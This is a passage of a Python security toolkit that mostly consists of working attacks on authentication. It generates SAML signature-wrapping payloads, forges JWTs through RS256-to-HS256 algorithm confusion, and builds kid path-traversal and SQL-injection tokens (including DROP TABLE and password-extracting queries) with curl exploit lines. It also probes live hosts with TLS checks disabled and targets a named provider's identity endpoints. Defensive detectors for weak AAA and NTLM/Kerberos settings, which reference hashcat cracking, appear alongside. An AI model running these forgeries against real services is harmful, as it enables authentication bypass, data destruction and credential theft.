    # Attacker moves forged assertion into a ds:Object element inside the ds:Signature
    xsw6 = signed_xml.replace(
        '</ds:Signature>',
        f'<ds:Object>{forged_assertion}</ds:Object></ds:Signature>',
        1,
    )
    variants.append((
        'XSW6',
        'Forged Assertion injected as ds:Object inside the Signature element. '
        'SP must not dereference assertions from within Signature.',
        xsw6,
    ))

    # XSW7: Forged Assertion inside saml:Advice of signed Assertion
    xsw7 = signed_xml.replace(
        '</saml:Assertion>',
        f'<saml:Advice>{forged_assertion}</saml:Advice></saml:Assertion>',
        1,
    )
    variants.append((
        'XSW7',
        'Forged Assertion embedded in saml:Advice. SP must ignore Advice content for authorization.',
        xsw7,
    ))

    # XSW8: Forged Assertion in a ds:Object at Response level, signed Assertion retained
    xsw8 = signed_xml.replace(
        '</samlp:Response>',
        f'<ds:Object xmlns:ds="http://www.w3.org/2000/09/xmldsig#">'
        f'{forged_assertion}'
        f'</ds:Object>'
        f'</samlp:Response>',
        1,
    )
    variants.append((
        'XSW8',
        'Forged Assertion in ds:Object at Response level. '
        'SP must not authorize based on Assertions outside signed scope.',
        xsw8,
    ))

    return variants


# ── Quantum vulnerability classification ─────────────────────────────────────

def classify_algorithm(alg_str):
    """Classify a cryptographic algorithm for quantum resistance.

    Returns: dict with vulnerable_to_quantum, algorithm_class, recommended_replacement
    """
    alg_upper = alg_str.upper().strip()

    if alg_upper in {a.upper() for a in QUANTUM_SAFE_ALGS}:
        return {
            'algorithm':              alg_str,
            'vulnerable_to_quantum':  False,
            'algorithm_class':        'Post-Quantum / Hash-based',
            'recommended_replacement': alg_str,
            'notes': 'Quantum-resistant (NIST PQC candidate or hash-based)',
        }

    if alg_upper in {a.upper() for a in QUANTUM_VULNERABLE_ALGS}:
        # Shor's algorithm (polynomial time) breaks all algorithms based on
        # integer factorization (RSA) and discrete log (ECDSA, DH, DSA).
        # NIST PQC standard replacements (2024):
        #   ML-KEM (CRYSTALS-Kyber)     FIPS 203 — key encapsulation
        #   ML-DSA (CRYSTALS-Dilithium) FIPS 204 — digital signatures
        #   SLH-DSA (SPHINCS+)          FIPS 205 — stateless hash-based signatures
        #   FN-DSA (Falcon)             — additional signature scheme
        replacement = {
            'RS': 'ML-DSA (CRYSTALS-Dilithium, FIPS 204) or SLH-DSA (SPHINCS+, FIPS 205)',
            'ES': 'ML-DSA (CRYSTALS-Dilithium, FIPS 204) — ECDSA direct replacement',
            'PS': 'ML-DSA (CRYSTALS-Dilithium, FIPS 204) or SLH-DSA (SPHINCS+, FIPS 205)',
            'ED': 'ML-DSA (FIPS 204) — EdDSA is safe today but Shor-vulnerable at scale',
            'EC': 'ML-KEM (CRYSTALS-Kyber, FIPS 203) for KEM; ML-DSA (FIPS 204) for signatures',
            'DH': 'ML-KEM (CRYSTALS-Kyber, FIPS 203)',
        }.get(alg_upper[:2], 'ML-DSA (FIPS 204) or SLH-DSA (FIPS 205)')

        return {
            'algorithm':              alg_str,
            'vulnerable_to_quantum':  True,
            'algorithm_class':        'Shor-vulnerable (RSA/ECC/DH)',
            'recommended_replacement': replacement,
            'nist_pqc_refs':          'FIPS 203 (ML-KEM), FIPS 204 (ML-DSA), FIPS 205 (SLH-DSA)',
            'notes': (
                "Shor's algorithm breaks RSA and ECDSA in polynomial time on a large enough "
                "quantum computer. NIST finalized PQC standards in 2024: ML-KEM (Kyber) for "
                "key exchange, ML-DSA (Dilithium) for signatures, SLH-DSA (SPHINCS+) as "
                "hash-based fallback. Migrate before CRQC (cryptographically-relevant quantum "
                "computer) timeline — store-now-decrypt-later attacks apply today."
            ),
        }

    if alg_upper in ('HS256', 'HS384', 'HS512'):
        # Grover's algorithm gives quadratic speedup against symmetric keys.
        # Halves effective key length: HS256 → 128-bit quantum security.
        # HS256 is still considered safe against current quantum hardware,
        # but the secret must be >= 256 bits to maintain 128-bit PQ security.
        bits = {'HS256': 128, 'HS384': 192, 'HS512': 256}.get(alg_upper, 128)
        return {
            'algorithm':              alg_str,
            'vulnerable_to_quantum':  True,
            'algorithm_class':        'Grover-weakened Symmetric HMAC',
            'quantum_security_bits':  bits,
            'recommended_replacement': (
                f'HS512 with >=256-bit random secret (Grover reduces to 256-bit security). '
                f'Current: {alg_upper} → {bits}-bit quantum security.'
            ),
            'notes': (
                "Grover's algorithm halves effective key length — quadratic speedup, not "
                "polynomial like Shor. HS256 with a strong secret remains practically secure "
                "against near-term quantum hardware, but a weak/empty secret is trivially "
                "crackable classically regardless of quantum considerations."
            ),
        }

    return {
        'algorithm':              alg_str,
        'vulnerable_to_quantum':  None,
        'algorithm_class':        'Unknown',
        'recommended_replacement': 'Assess manually',
        'notes': 'Unknown algorithm — manual classification required',
    }


# ── Protocol-Level Weakness Detection ────────────────────────────────────────
# Source: Applied Cryptography (Schneier) Ch.3 (Basic Protocols: key exchange,
#         authentication, replay/reflection), Ch.9 (Algorithm Types and Modes:
#         CBC/ECB/CTR), Ch.2 (Protocol Building Blocks: challenge-response, PRNG);
#         Access Control, Authentication, and PKI 2nd Ed. Ch.12 (RADIUS/TACACS+)

# TACACS_RADIUS_WEAKNESSES: attack-surface descriptions for AAA protocol text audit.
# Each entry: pattern_name -> (regex, severity, issue_description)
# Designed for config files, packet captures, syslog, and show-running output.
#
# Cryptographic basis (Applied Cryptography Ch.3; Access Control 2nd Ed. Ch.12):
#   TACACS+ body encrypted with XOR(MD5(key || session_id || seq_no)).
#   session_id and seq_no are transmitted in plaintext header, so the only secret
#   is the shared key — offline HMAC-MD5 brute-force from packet capture applies.
#   RADIUS User-Password: XOR'd with MD5(shared_secret || authenticator).
#   authenticator also cleartext in Access-Request; short secrets crackable offline
#   with hashcat -m 16100 (RADIUS/CHAP) or -m 1450 (HMAC-MD5) rule attack.

TACACS_RADIUS_WEAKNESSES = {
    # ── TACACS+ ───────────────────────────────────────────────────────────────
    'TACACS_SHORT_KEY': (
        r'key\s+(?:0\s+)?["\']?\S{1,7}["\']?',
        'CRITICAL',
        (
            'TACACS+ shared key <= 7 chars — XOR(MD5(key||session_id||seq_no)) body encryption '
            'brute-forceable offline from packet capture; session_id+seq_no in cleartext header '
            'reduce search to key alone (Applied Cryptography Ch.3; Access Control 2nd Ed. Ch.12)'
        ),
    ),
    'TACACS_CLEARTEXT_KEY_TYPE0': (
        r'key\s+0\s+',
        'HIGH',
        (
            'TACACS+ key stored type-0 (cleartext) — visible in running-config and NVRAM; '
            'use type-6 AES-encrypted key storage minimum (IOS 15.x+)'
        ),
    ),
    'TACACS_MD5_ONLY_ENCRYPTION': (
        r'tacacs-server\s+host\s+\S+\s+key\s+\S+',
        'HIGH',
        (
            'TACACS+ host key without per-attribute encryption — body uses MD5-XOR only; '
            'authorization response attribute tampering possible if MITM between NAS '
            'and TACACS+ server (Access Control 2nd Ed. Ch.12 sec.12.10)'
        ),
    ),
    # ── RADIUS ────────────────────────────────────────────────────────────────
    'RADIUS_MD5_USER_PASSWORD': (
        r'User-Password\s*=',
        'HIGH',
        (
            'RADIUS User-Password attribute in trace — XOR\'d with MD5(secret||authenticator); '
            'authenticator transmitted cleartext; offline crack of short shared secrets via '
            'hashcat -m 16100 with Access-Request capture (Applied Cryptography Ch.3 sec.3.2)'
        ),
    ),
    'RADIUS_SHORT_SECRET': (
        r'secret\s*=\s*["\']?\S{1,8}["\']?',
        'CRITICAL',
        (
            'RADIUS shared secret <= 8 chars — MD5(secret||authenticator) brute-forceable; '
            'enables User-Password decryption, Access-Accept forgery, Reply-Message injection; '
            'minimum 22 high-entropy chars required (RFC 2865 sec.3; Access Control 2nd Ed. Ch.12)'
        ),
    ),
    'RADIUS_PAP_AUTH': (
        r'auth-type\s+pap',
        'HIGH',
        (
            'RADIUS PAP auth-type — User-Password is sole credential protection; '
            'no transport encryption in RADIUS over UDP; shared secret leak exposes all passwords '
            '(Access Control 2nd Ed. Ch.12 sec.12.7 — RADIUS encrypts password only, not session)'
        ),
    ),
    'RADIUS_ACCOUNTING_NONE': (
        r'aaa\s+accounting\s+(?:exec|commands)\s+\w+\s+none',
        'MEDIUM',
        (
            'RADIUS accounting disabled — no session audit trail; replay attacks and '
            'credential reuse undetectable; enable accounting to catch duplicate session_id/NAS-Port reuse'
        ),
    ),
    # ── Generic AAA ───────────────────────────────────────────────────────────
    'AAA_LOCAL_FALLBACK': (
        r'aaa\s+authentication\s+\S+\s+\S+\s+(?:local|local-case)',
        'MEDIUM',
        (
            'AAA local fallback enabled — if TACACS+/RADIUS unreachable, local credentials apply; '
            'local accounts often have static passwords outside AAA policy; '
            'DoS against AAA server forces fallback (Applied Cryptography Ch.3 sec.3.2)'
        ),
    ),
    'AAA_NONE_FALLBACK': (
        r'aaa\s+authentication\s+\S+\s+\S+\s+none',
        'CRITICAL',
        (
            'AAA fallback method is "none" — if TACACS+/RADIUS unreachable, authentication '
            'bypassed entirely; any device with network path gets full access; '
            'remove "none" from method list immediately (Applied Cryptography Ch.3 sec.3.2)'
        ),
    ),
}


def scan_authentication_protocol_weaknesses(network_captures_or_text: str) -> list:
    """Scan text (configs, logs, captured headers, packet decode) for auth protocol weaknesses.

    Detection patterns (Applied Cryptography Schneier Ch.3 sec.3.2, Ch.9 sec.9.3;
    Access Control, Authentication, and PKI 2nd Ed. Ch.12):

    NTLM v1 — challenge-response uses DES keyed on the NT hash split into three 7-byte segments.
      An attacker with NTLMv1 challenge + response recovers the NT hash via rainbow table or GPU
      in hours. The magic bytes NTLMSSP\\x00\\x01 in a hex dump identify a Negotiate message.
      In HTTP traces, NTLM in WWW-Authenticate without explicit v2 signals NTLMv1 exposure.

    RADIUS User-Password — attribute XOR'd with MD5(shared_secret || authenticator).
      The authenticator is cleartext in the Access-Request packet. Any captured request plus
      a weak shared secret is sufficient for offline dictionary attack without further access.

    Kerberos RC4 (etype 23 / rc4-hmac) — TGS ticket encrypted with the account NT hash.
      AS-REP Roasting requires no prior auth when pre-auth is disabled (UF_DONT_REQUIRE_PREAUTH).
      Kerberoasting extracts TGS tickets for any SPN-mapped account. Both yield offline RC4
      crackable material; AES128/256 (etype 17/18) forces key-based cracking instead.

    Basic Auth over HTTP — credentials are base64(user:pass), not encrypted. Any on-path
      observer recovers them. HTTP Basic is equivalent to cleartext credential transmission
      (Applied Cryptography Ch.2 sec.2.2 — symmetric communication requires transport security).

    Telnet (port 23) — no encryption; entire session capturable. Replace with SSH.

    FTP PASS — control channel carries PASSWORD in cleartext; passive/active mode data
      channel is separate; credential exposure is always in the control channel.

    Args:
        network_captures_or_text: String of config content, log output, or packet decode text
                                   (Wireshark text export, tcpdump -A output, syslog lines).

    Returns:
        list of dicts: [{'weakness': str, 'severity': str, 'line': int, 'detail': str}]
        Sorted CRITICAL first, then HIGH, then by line number.
    """
    findings = []
    lines = network_captures_or_text.splitlines()

    _PROTO_PATTERNS = [
        # NTLM v1 negotiate bytes in hex dump or raw capture
        (
            re.compile(r'NTLMSSP\\x00\\x01|NTLMSSP\x00\x01', re.IGNORECASE),
            'NTLM_V1_NEGOTIATE',
            'CRITICAL',
            'NTLMv1 Negotiate message — NT hash sufficient for offline crack via rainbow table or GPU; force NTLMv2 minimum via GPO',
        ),
        # NTLM in WWW-Authenticate without v2 qualifier
        (
            re.compile(r'WWW-Authenticate:\s*NTLM(?!\s*v2)', re.IGNORECASE),
            'NTLM_V1_WWW_AUTH',
            'CRITICAL',
            'NTLM in WWW-Authenticate without v2 qualifier — NTLMv1 likely; offline NT hash recovery from challenge/response pair',
        ),
        # RADIUS User-Password attribute visible in trace
        (
            re.compile(r'User-Password\s*=\s*\S', re.IGNORECASE),
            'RADIUS_USER_PASSWORD_EXPOSED',
            'HIGH',
            'RADIUS User-Password attribute in trace — XOR(MD5(secret||authenticator)); offline crackable if shared secret is weak',
        ),
        # Kerberos RC4 etype 23
        (
            re.compile(r'etype\s+23\b|rc4[-_]hmac|etype=0x17', re.IGNORECASE),
            'KERBEROS_RC4_ETYPE23',
            'HIGH',
            'Kerberos RC4-HMAC etype 23 — AS-REP Roasting / Kerberoasting yields offline-crackable NT hash material; migrate to AES256 etype 18',
        ),
        # Basic Auth header in an http:// URL context
        (
            re.compile(r'http://\S+.*Authorization:\s*Basic\s+|Authorization:\s*Basic\s+\S+.*http://', re.IGNORECASE),
            'BASIC_AUTH_OVER_HTTP',
            'HIGH',
            'HTTP Basic Auth over http:// — base64 credential exposure to any on-path observer; enforce HTTPS + HSTS',
        ),
        # Basic Auth header with no surrounding https context
        (
            re.compile(r'Authorization:\s*Basic\s+[A-Za-z0-9+/=]{4}', re.IGNORECASE),
            'BASIC_AUTH_CLEARTEXT_CONTEXT',
            'HIGH',
            'Authorization: Basic — credentials base64-encoded, not encrypted; verify transport is HTTPS; use Bearer/OAuth if possible',
        ),
        # Telnet password prompt following a username prompt
        (
            re.compile(r'Password:\s*$', re.IGNORECASE),
            'TELNET_CREDENTIAL_EXPOSURE',
            'CRITICAL',
            'Telnet Password: prompt — credentials in cleartext on port 23; full session capturable by on-path observer; replace with SSH',
        ),
        # FTP PASS command
        (
            re.compile(r'^\s*PASS\s+\S', re.IGNORECASE),
            'FTP_PASS_CLEARTEXT',
            'CRITICAL',
            'FTP PASS command — password in cleartext over control channel; use SFTP (SSH subsystem) or FTPS (TLS)',
        ),
    ]

    sev_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}

    for lineno, line in enumerate(lines, start=1):
        for rx, weakness, severity, detail in _PROTO_PATTERNS:
            if rx.search(line):
                findings.append({
                    'weakness': weakness,
                    'severity': severity,
                    'line':     lineno,
                    'detail':   detail,
                })

    findings.sort(key=lambda f: (sev_order.get(f['severity'], 9), f['line']))
    return findings


def check_padding_oracle_surface(host: str, port: int, path: str = '/') -> dict:
    """Test for CBC padding oracle surface via HTTP response differentiation.

    Mechanism (Applied Cryptography Ch.9 sec.9.3 — Cipher Block Chaining Mode):
      CBC decryption: P_i = D_K(C_i) XOR C_{i-1}
      A padding oracle leaks whether a modified ciphertext has valid PKCS#7 padding
      by returning a distinguishable server response (typically 500 vs 200/403).
      Attacker flips the last byte of the second-to-last block; the XOR in decryption
      changes a single byte of P_n. By cycling all 256 values and watching for
      the server to return a valid-padding response, the plaintext byte is recovered.
      Repeat for all bytes: O(256 * block_size * n_blocks) requests = full plaintext.
      (Vaudenay 2002; CVE-2014-3566 POODLE; CVE-2016-2107 Lucky13)

    This probe sends one modified ciphertext to detect the surface — it does not
    run the full byte-recovery loop. A 500 on the flip where a baseline returns
    200/403 is the distinguishing signal.

    Uses urllib.request only. Unverified SSL context for HTTPS targets.

    Args:
        host: Target hostname or IP.
        port: Target port (443/8443 = HTTPS, all else = HTTP).
        path: Request path (default '/').

    Returns:
        dict: {
          'oracle_likely':   bool,
          'status_valid':    int or None,
          'status_modified': int or None,
          'detail':          str,
        }
    """
    import os
    import base64 as _b64

    scheme = 'https' if port in (443, 8443) else 'http'
    base_url = f'{scheme}://{host}:{port}{path}'

    # Two full 16-byte blocks (32 bytes) — simulate a CBC ciphertext
    baseline_bytes = os.urandom(32)
    baseline_b64   = _b64.b64encode(baseline_bytes).decode()

    # Flip all bits of byte 15 (last byte of the first 16-byte block)
    # In CBC this corrupts the last byte of P_2 during decryption
    modified      = bytearray(baseline_bytes)
    modified[15] ^= 0xFF
    modified_b64   = _b64.b64encode(bytes(modified)).decode()

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE

    def _fetch(cookie_val):
        headers = {
            'Cookie':     f'session={urllib.parse.quote(cookie_val)}',
            'User-Agent': 'Mozilla/5.0',
        }
        try:
            req = urllib.request.Request(base_url, headers=headers)
            with urllib.request.urlopen(req, timeout=5, context=ctx) as resp:
                return resp.status
        except urllib.error.HTTPError as e:
            return e.code
        except Exception:
            return None

    status_valid    = _fetch(baseline_b64)
    status_modified = _fetch(modified_b64)

    oracle_likely = (
        status_valid    is not None
        and status_modified is not None
        and status_valid    != status_modified
        and status_modified == 500
    )

    if oracle_likely:
        detail = (
            f'Padding oracle surface detected: baseline={status_valid}, '
            f'single-byte-flip={status_modified}. Server returns 500 on invalid padding — '
            f'byte-by-byte plaintext recovery possible without the key '
            f'(Vaudenay 2002; Applied Cryptography Ch.9 sec.9.3).'
        )
    elif status_valid is None:
        detail = f'Baseline request failed — target unreachable or rejected connection at {base_url}'
    else:
        detail = (
            f'No padding oracle signal: baseline={status_valid}, modified={status_modified}. '
            f'Target may use AEAD (GCM/ChaCha20-Poly1305) or does not CBC-decrypt cookie server-side.'
        )

    return {
        'oracle_likely':   oracle_likely,
        'status_valid':    status_valid,
        'status_modified': status_modified,
        'detail':          detail,
    }


def check_replay_protection(host: str, port: int, path: str = '/api/', timeout: float = 5.0) -> dict:
    """Test for missing replay protection via identical-request repetition.

    Mechanism (Applied Cryptography Ch.3 sec.3.2 — Authentication and Key Exchange):
      A replay attack re-submits a captured authenticated request to achieve the
      same authenticated effect. Proper mitigation requires at least one of:
        - Nonce: server-issued random value covered by request MAC
        - Timestamp: request embeds current time; server rejects outside a short window
        - Sequence number: monotonically incrementing per-session counter
        - Challenge-response: server issues a fresh challenge each round
      Without these, any observer on the network can replay a valid session request
      indefinitely (Applied Cryptography Ch.3 sec.3.3 — reflection attacks also apply
      when the same challenge is reused across sessions or protocols).

    Test procedure:
      1. Send GET to path with a fixed Authorization Bearer token (baseline).
      2. Replay the identical request 3 times with the same headers.
      3. If all 3 replays return 200: replay protection absent — nonce/timestamp not enforced.
      Note: a fixed test token is used; a 200 on an unrecognized token signals unauth access
      (separate finding). Manual re-test with a captured valid token is recommended to confirm.

    Args:
        host:    Target hostname or IP.
        port:    Target port.
        path:    API path (default '/api/').
        timeout: Per-request timeout in seconds.

    Returns:
        dict: {
          'replay_accepted': bool,
          'replay_count':    int,   # replays (of 3) that returned 200
          'detail':          str,
        }
    """
    scheme = 'https' if port in (443, 8443) else 'http'
    url = f'{scheme}://{host}:{port}{path}'

    test_token = (
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.'
        'eyJzdWIiOiJ0ZXN0IiwiaWF0IjoxNjAwMDAwMDAwfQ.'
        'replay_probe_token'
    )
    fixed_headers = {
        'Authorization': f'Bearer {test_token}',
        'Content-Type':  'application/json',
        'User-Agent':    'Mozilla/5.0',
        'Accept':        'application/json',
    }

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE

    def _do_request():
        try:
            req = urllib.request.Request(url, headers=fixed_headers)
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                return resp.status
        except urllib.error.HTTPError as e:
            return e.code
        except Exception:
            return None

    baseline_status  = _do_request()
    replay_statuses  = [_do_request() for _ in range(3)]
    replay_200_count = sum(1 for s in replay_statuses if s == 200)
    replay_accepted  = (baseline_status == 200 and replay_200_count == 3)

    if replay_accepted:
        detail = (
            f'Replay attack likely: baseline={baseline_status}, '
            f'all 3 replays returned 200. '
            f'No nonce/timestamp/sequence-number validation detected — '
            f'captured authenticated requests replayable indefinitely '
            f'(Applied Cryptography Ch.3 sec.3.2 — replay protection requirements).'
        )
    else:
        detail = (
            f'No replay acceptance signal: baseline={baseline_status}, '
            f'replay statuses={replay_statuses}. '
            f'Server may enforce nonce, timestamp, or session binding. '
            f'Re-test with a captured valid token to confirm.'
        )

    return {
        'replay_accepted': replay_accepted,
        'replay_count':    replay_200_count,
        'detail':          detail,
    }


# ── HTTP helpers ──────────────────────────────────────────────────────────────

def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    return ctx


def _http_get(url, headers=None, timeout=5):
    if _HAS_REQUESTS:
        try:
            r = _requests.get(url, headers=headers or {}, verify=False, timeout=timeout)
            return r.status_code, r.text
        except Exception as e:
            return None, str(e)
    try:
        req = urllib.request.Request(url, headers=headers or {})
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as resp:
            return resp.status, resp.read().decode('utf-8', errors='replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', errors='replace')
    except Exception as e:
        return None, str(e)


def _http_post(url, data, headers=None, timeout=5):
    if _HAS_REQUESTS:
        try:
            r = _requests.post(url, json=data, headers=headers or {}, verify=False, timeout=timeout)
            return r.status_code, r.text
        except Exception as e:
            return None, str(e)
    body = json.dumps(data).encode()
    hdrs = {'Content-Type': 'application/json'}
    hdrs.update(headers or {})
    try:
        req = urllib.request.Request(url, data=body, headers=hdrs, method='POST')
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as resp:
            return resp.status, resp.read().decode('utf-8', errors='replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', errors='replace')
    except Exception as e:
        return None, str(e)


def probe_idp_macstadium(token, extra_endpoints=None):
    """Probe MacStadium IdP with a JWT Bearer token.

    Returns: list of {endpoint, status, body_excerpt, finding}
    """
    results   = []
    endpoints = list(MACSTADIUM_IDP_ENDPOINTS) + (extra_endpoints or [])

    for ep in endpoints:
        url = MACSTADIUM_IDP + ep
        sc, body = _http_get(url, headers={'Authorization': f'Bearer {token}'})

        finding = None
        if sc == 200:
            finding = 'AUTHENTICATED_200'
        elif sc == 201:
            finding = 'CREATED_201'
        elif sc == 403:
            finding = 'FORBIDDEN_403'
        elif sc == 401:
            finding = 'UNAUTHORIZED_401'

        results.append({
            'endpoint':     url,
            'status':       sc,
            'body_excerpt': (body or '')[:200],
            'finding':      finding,
        })

    return results


# ── Algorithm confusion attack (RS256 → HS256) ───────────────────────────────

def attack_algorithm_confusion(token, public_key_pem):
    """RS256 → HS256 algorithm confusion attack.

    Attack origin: Aleph.nu (Tim McLean) 2015, CVE-2015-9235.
    Mechanism (grounded in Real-World Cryptography ch. 9 / Applied Cryptography ch. 19):
      1. Server validates RS256 JWTs using RSA public key.
      2. Vulnerable libraries dispatch on header['alg'] without enforcing expected type.
      3. Attacker obtains RSA public key (from /.well-known/jwks.json or TLS cert).
      4. Attacker re-signs token as HS256, using the PEM-encoded public key as the HMAC secret.
      5. Server fetches public key, passes it as the 'secret' to HMAC verify -> verifies correctly.

    Args:
        token:          Original RS256 JWT string
        public_key_pem: RSA public key in PEM format (bytes or str)

    Returns:
        (forged_token_str, error_str) — error_str is None on success
    """
    header, payload, sig, parts = decode_jwt(token)
    if not header:
        return None, 'Invalid JWT'

    if isinstance(public_key_pem, str):
        public_key_pem = public_key_pem.encode('utf-8')

    # Strip CRLF line endings to normalize PEM bytes (some servers normalize differently)
    pem_normalized = public_key_pem.replace(b'\r\n', b'\n')

    h2 = dict(header)
    h2['alg'] = 'HS256'

    h_enc = _b64url_encode(json.dumps(h2, separators=(',', ':')).encode())
    p_enc = parts[1]  # preserve original payload encoding
    msg   = f'{h_enc}.{p_enc}'.encode()

    # HMAC secret = RSA public key PEM bytes (the confusion: library treats PEM as symmetric secret)
    sig_bytes = _hs256_sign(msg, pem_normalized)
    forged    = f'{h_enc}.{p_enc}.{_b64url_encode(sig_bytes)}'
    return forged, None


def attack_algorithm_confusion_from_cert(token, cert_pem):
    """Variant: extract RSA public key from X.509 cert PEM, then run confusion attack.

    The public key is available from the TLS certificate or JWKS endpoint.
    This variant accepts a full cert PEM and extracts the public key block.

    Returns: (forged_token, error)
    """
    if isinstance(cert_pem, str):
        cert_pem = cert_pem.encode()

    if b'BEGIN CERTIFICATE' in cert_pem:
        # Try to extract RSA public key block if cryptography lib is available
        try:
            from cryptography import x509
            from cryptography.hazmat.primitives import serialization
            cert = x509.load_pem_x509_certificate(cert_pem)
            pub_pem = cert.public_key().public_bytes(
                serialization.Encoding.PEM,
                serialization.PublicFormat.SubjectPublicKeyInfo,
            )
            return attack_algorithm_confusion(token, pub_pem)
        except ImportError:
            pass
        except Exception as e:
            return None, f'cert extraction failed: {e}'

    # Fallback: use raw cert PEM as HMAC secret (some libraries do this)
    return attack_algorithm_confusion(token, cert_pem)


# ── JWKS endpoint probing and key confusion ───────────────────────────────────

JWKS_WELL_KNOWN_PATHS = [
    '/.well-known/jwks.json',
    '/.well-known/openid-configuration',
    '/oauth2/v1/keys',
    '/auth/realms/master/protocol/openid-connect/certs',
    '/oauth/discovery/keys',
    '/api/v1/keys',
    '/.well-known/keys',
    '/jwks',
    '/jwks.json',
    '/keys',
    '/public_keys',
]


def probe_jwks_endpoints(base_url, extra_paths=None, timeout=5):
    """Probe known JWKS paths and extract public key material.

    Returns: list of {url, status, keys, raw_body, error}

    Key confusion attack (from the JWKS response):
      1. Fetch public key from /jwks.json
      2. Use kid to forge a token with attacker-controlled key material
      3. If server trusts the kid without pinning the expected key type, attacker wins
    """
    paths   = list(JWKS_WELL_KNOWN_PATHS) + (extra_paths or [])
    results = []

    for path in paths:
        url     = base_url.rstrip('/') + path
        sc, body = _http_get(url, timeout=timeout)
        entry = {'url': url, 'status': sc, 'keys': [], 'raw_body': '', 'error': None}

        if sc == 200 and body:
            entry['raw_body'] = body[:500]
            try:
                data = json.loads(body)
                keys = data.get('keys', []) if isinstance(data, dict) else []
                for k in keys:
                    entry['keys'].append({
                        'kid':  k.get('kid'),
                        'kty':  k.get('kty'),
                        'alg':  k.get('alg'),
                        'use':  k.get('use'),
                        'n':    k.get('n', '')[:32] + '...' if k.get('n') else None,
                        'e':    k.get('e'),
                        'crv':  k.get('crv'),
                        'x':    k.get('x', '')[:32] + '...' if k.get('x') else None,
                    })
            except json.JSONDecodeError:
                entry['error'] = 'non-JSON response'

            # Look for inline JWK confusion opportunity
            if entry['keys']:
                entry['confusion_vector'] = (
                    f'Found {len(entry["keys"])} key(s). '
                    'Attempt: forge HS256 JWT using n+e values from RSA JWK as PEM secret.'
                )

        results.append(entry)

    return results


def jwk_to_rsa_pem(jwk_dict):
    """Convert a JWK RSA public key dict to PEM bytes for algorithm confusion.

    Returns PEM bytes or None if conversion fails.
    """
    import base64 as _b64

    try:
        from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
        from cryptography.hazmat.primitives import serialization

        def _b64url_int(s):
            padded = s + '=' * (-len(s) % 4)
            return int.from_bytes(_b64.urlsafe_b64decode(padded), 'big')

        n = _b64url_int(jwk_dict['n'])
        e = _b64url_int(jwk_dict['e'])
        pub = RSAPublicNumbers(e, n).public_key()
        return pub.public_bytes(
            serialization.Encoding.PEM,
            serialization.PublicFormat.SubjectPublicKeyInfo,
        )
    except ImportError:
        return None
    except Exception:
        return None


# ── JWT kid (key ID) injection attacks ───────────────────────────────────────

def attack_kid_injection(payload, target_base_url=None):
    """Generate JWT kid injection payloads.

    The 'kid' (Key ID) header parameter is used to select the verification key.
    Vulnerable servers construct file paths or SQL queries using kid without validation.

    Attack classes (Applied Cryptography ch. 2 / OWASP JWT Security Cheat Sheet):

    1. Path traversal: kid='../../dev/null' or kid='../../proc/sys/kernel/randomize_va_space'
       If server does `hmac.verify(key=open(kid).read(), ...)`, empty file = empty HMAC secret.
       /dev/null reads as empty bytes -> same as empty-string HS256 attack.

    2. SQL injection: kid="x' UNION SELECT 'attacker_controlled_key' --"
       If server does `SELECT key FROM keys WHERE kid='<kid>'`, attacker controls the key.

    3. Blank/null kid with weak default key behavior

    Returns:
        list of {description, token, kid, attack_class}
    """
    now    = int(time.time())
    base_p = dict(payload)
    if 'iat' not in base_p:
        base_p['iat'] = now
    if 'exp' not in base_p:
        base_p['exp'] = now + 3600

    attacks = []

    # ── 1. Path traversal kid attacks ──
    path_traversal_kids = [
        ('../../dev/null',                       'empty_file',    b''),
        ('../../../dev/null',                     'empty_file_3',  b''),
        ('/dev/null',                             'abs_dev_null',  b''),
        ('../../proc/sys/kernel/randomize_va_space', 'kernel_file', b'0\n'),
        ('../../etc/hostname',                    'hostname_file', None),  # unknown content
        ('../../dev/zero',                        'zero_bytes',    b'\x00' * 32),
    ]

    for kid_val, label, secret in path_traversal_kids:
        if secret is None:
            # We don't know the file content, but generate the token anyway for testing
            secret = b''

        header = {'alg': 'HS256', 'typ': 'JWT', 'kid': kid_val}
        h_enc  = _b64url_encode(json.dumps(header, separators=(',', ':')).encode())
        p_enc  = _b64url_encode(json.dumps(base_p, separators=(',', ':')).encode())
        msg    = f'{h_enc}.{p_enc}'.encode()
        sig    = _hs256_sign(msg, secret)
        token  = f'{h_enc}.{p_enc}.{_b64url_encode(sig)}'

        attacks.append({
            'attack_class': 'PATH_TRAVERSAL',
            'description':  f'kid path traversal: {kid_val!r} -> secret={repr(secret)[:20]}',
            'kid':          kid_val,
            'secret_used':  repr(secret[:20]),
            'token':        token,
            'exploit':      (
                f'curl -H "Authorization: Bearer {token[:60]}..." '
                f'{target_base_url or "<target>"}/api/v1/'
            ),
        })

    # ── 2. SQL injection kid attacks ──
    sql_injection_kids = [
        ("' OR '1'='1",                                   b'1'),
        ("x' UNION SELECT 'secret' --",                   b'secret'),
        ("x'; DROP TABLE keys; --",                       b''),
        ("x' UNION SELECT password FROM users LIMIT 1 --", b''),
        ('1 OR 1=1',                                       b''),
    ]

    for kid_val, secret in sql_injection_kids:
        header = {'alg': 'HS256', 'typ': 'JWT', 'kid': kid_val}
        h_enc  = _b64url_encode(json.dumps(header, separators=(',', ':')).encode())
        p_enc  = _b64url_encode(json.dumps(base_p, separators=(',', ':')).encode())
        msg    = f'{h_enc}.{p_enc}'.encode()
        sig    = _hs256_sign(msg, secret)
        token  = f'{h_enc}.{p_enc}.{_b64url_encode(sig)}'

        attacks.append({
            'attack_class': 'SQL_INJECTION',
            'description':  f'kid SQL injection: kid={kid_val!r}',
            'kid':          kid_val,
            'secret_used':  repr(secret),
            'token':        token,
            'exploit':      (
                f'curl -H "Authorization: Bearer {token[:60]}..." '
                f'{target_base_url or "<target>"}/api/v1/'
            ),
        })

    # ── 3. Blank / null kid attacks ──
